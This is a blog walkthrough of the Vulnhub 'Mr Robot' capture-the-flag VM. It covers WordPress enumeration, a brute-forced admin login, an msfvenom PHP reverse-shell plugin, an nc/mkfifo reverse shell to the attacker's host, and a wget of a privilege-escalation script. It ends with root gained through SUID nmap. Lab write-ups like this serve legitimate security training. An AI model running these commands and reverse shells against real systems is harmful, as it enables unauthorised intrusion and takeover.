---
layout: post
title: Mr Robot VM Walkthrough
---

# Walkthrough

![]({{ site.url }}/public/posts/mrrobot/mr-robot.png)

As stated, this machine wasn't too difficult but it was fun nevertheless. I rooted it as part of a work presentation to showcase a common intrusion scenario.

[Mr Robot on Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/)

## Enumeration

Running Nikto against the IP, we have a few indications of vulnerabilities, the most interesting (for now) being this one:

> -   Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad

If we check robots.txt's contents, it's indeed interesting:

```sh
curl http://$ip/robots.txt
```

```
User-agent: \*
fsocity.dic 
key-1-of-3.txt
```

Checking the files, one of them is obviously one of the keys, the other seems to be a dictionary file. Maybe it'll be useful later? (Spoilers: it will)

Nikto also shows us that this is a wordpress installation. Its version is under <http://mrrobot/wp-links-opml.php>, and it is WordPress/4.3.16.

Seems like there are some vulnerabilities we can use.

Let's check for extra info there:

```sh
wpscan --url $ip
```

## Low-privilege shell

Now we can try to crack the password using the given dictionary file and username elliot (how I found it? Guessing. Not surprising for a VM called 'Mr Robot', huh? You could say this is part of information gathering, social engineering or whatever. It's why any small piece of info matters for an attacker.)

```sh
medusa -f -h mrrobot -u elliot -P /root/vulnhub/mrrobot/fsocity.dic -M web-form -m FORM:"wp-login.php" -m DENY-SIGNAL:"ERROR" -m FORM-DATA:"post?log=&pwd=&"
```

After a non-trivial amount of time, we figured out the password is ER28-0652. On to the admin panel!

Tip: We can check for vulnerable versions of plugins with the following command:

```sh
wpscan --url http://$ip --enumerate vp
```

We can upload a malicious plugin to give us access to the WP host. Basically it's a PHP file with some extra stuff added.

```sh
msfvenom -p php/reverse_php LHOST="$iattacker" LPORT=80 2>>/dev/null
```

After editing it under wp-rev-shell.php, we'll get a WP plugin, something that looks like the following:

```php
 <?php
/**
 * Plugin Name: RevShell
 * Version: 5.10.3
 * Author: Progfrog
 * Author URI: http://Progfrog.com
 * License: GPL2
 */
// msfvenom payload here, omitted for brevity...
?>
```

Then we can zip it:

```sh
zip plugin.zip wp-rev-shell.php
```

After adding it there and activating it, we can get a reverse shell by visiting <http://mrrobot/wp-content/plugins/revshell_/wp-rev-shell.php>:

Apparently we have something readable under /home/robot:

```sh
cat /home/robot/password.raw-md5
```

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Guess what is that? A password that we can crack with some feline help:

![]({{ site.url }}/public/posts/mrrobot/hashcat-crazy.gif)

```sh
echo c3fcd3d76192e4007dfb496cca67e13b > password.raw.md5
```

```sh
hashcat -a 0 password.raw.md5 --force
```

Or, if you value your time and your machine's ALU, go to <https://crackstation.net/> and paste the hash there. It'll spit out that the password is abcdefghijklmnopqrstuvwxyz.

Unfortunately we still need to get a proper tty. We're running code in context of the web server, which is why 1) our session is short-lived and 2) we never get a tty. We can use <span class="underline">another</span> session to spawn a proper interactive shell and go from there.

Apparently we're running bash, so we can use some of the [usual bash tricks](https://highon.coffee/blog/reverse-shell-cheat-sheet/) for getting a reverse shell:

```sh
rm /tmp/pipe;mkfifo /tmp/pipe;cat /tmp/pipe|/bin/sh -i 2>&1|nc $iattacker 9999 >/tmp/pipe
```

Then we can finally use the discovered password:

```sh
su robot
```

Another step closer:

```sh
cd ~
cat key-2-of-3.txt
```

```
822c73956184f694993bede3eb39f959
```

## Privilege escalation

Let's run the usual recon scripts:

```sh
cd /tmp
wget iattacker/linuxprivchecker.py
python linuxprivchecker.py > /tmp/lpc-results.txt
```

Looking at this file, we can see something interesting under the SUID binaries: nmap is there. It shouldn't be, since it allows us to execute code with the '&#x2013;interactive' flag, even pop a shell. Let's see if it works&#x2026;

```sh
nmap --interactive
```

```sh
!sh
```

In this new shell, who are we?

```sh
id
```

```
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

This means that now we can do everything in the system, and our work here is done.

![]({{ site.url }}/public/posts/mrrobot/groot-dance.gif)
